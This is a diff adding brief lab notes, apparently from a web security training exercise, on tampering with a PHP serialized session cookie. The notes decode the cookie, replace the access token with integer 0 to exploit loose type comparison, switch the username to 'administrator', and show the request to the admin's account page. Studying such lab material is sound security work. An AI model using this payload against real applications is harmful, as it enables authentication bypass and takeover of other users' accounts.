@@ -1,0 +1,16 @@
+log
+
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1aWhmbjA4cm1hNWpma3Z5cWo4Z2VnenF6bXBxcjcxbyI7fQ%3d%3d
+
+    remember: %3d is URL-encoding for = . So %3d%3d is ==.
+
+    ORIGINAL
+    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"uihfn08rma5jfkvyqj8gegzqzmpqr71o";}
+
+    TAMPERED
+    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
+
+    AND THEN 
+    O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+    plus
+    GET /my-account?id=administrator HTTP/2
